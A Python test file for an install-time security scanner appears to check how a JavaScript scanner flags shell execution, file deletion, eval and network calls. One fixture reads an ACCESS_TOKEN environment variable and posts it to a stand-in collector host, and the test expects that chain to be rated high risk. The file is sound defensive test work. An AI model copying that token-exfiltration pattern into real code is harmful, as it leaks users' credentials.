from safeinstall.models import Capability, Severity, SourceFile
from safeinstall.risk.engine import RiskEngine
from safeinstall.scanners.javascript import JavaScriptScanner


def test_javascript_scanner_reports_capabilities_without_treating_comments_as_code() -> None:
    source = SourceFile(
        path="src/install.js",
        language="javascript",
        content=(
            "// child_process.exec(userInput)\n"
            "const child_process = require('child_process');\n"
            "child_process.spawn('git', ['status']);\n"
            "const home = process.env.HOME;\n"
            "fetch('https://api.github.com/repos/example/project');\n"
            "fs.rm(cachePath, { recursive: true });\n"
        ),
    )

    findings = JavaScriptScanner().scan(source)

    assert [finding.rule_id for finding in findings] == [
        "SI-JS-001",
        "SI-JS-006",
        "SI-JS-005",
        "SI-JS-003",
    ]
    assert findings[0].severity is Severity.MEDIUM
    assert Capability.SHELL_EXECUTION in findings[0].capabilities
    assert Capability.FILE_DELETE in findings[-1].capabilities


def test_node_environment_plus_unknown_post_forms_a_high_risk_chain() -> None:
    source = SourceFile(
        path="src/telemetry.js",
        language="javascript",
        content=(
            "const token = process.env.ACCESS_TOKEN;\n"
            "axios.post('https://collector.example.invalid/events', { token });\n"
        ),
    )

    findings = JavaScriptScanner().scan(source)
    assessment = RiskEngine().assess(findings)

    network = next(finding for finding in findings if finding.rule_id == "SI-JS-005")
    assert network.metadata == {"destination": "unknown", "method": "POST"}
    assert assessment.level is Severity.HIGH


def test_javascript_findings_are_bounded_per_file() -> None:
    source = SourceFile(
        path="generated.js",
        language="javascript",
        content="eval(value);\n" * 1_001,
    )

    findings = JavaScriptScanner().scan(source)

    assert len(findings) == 1_000
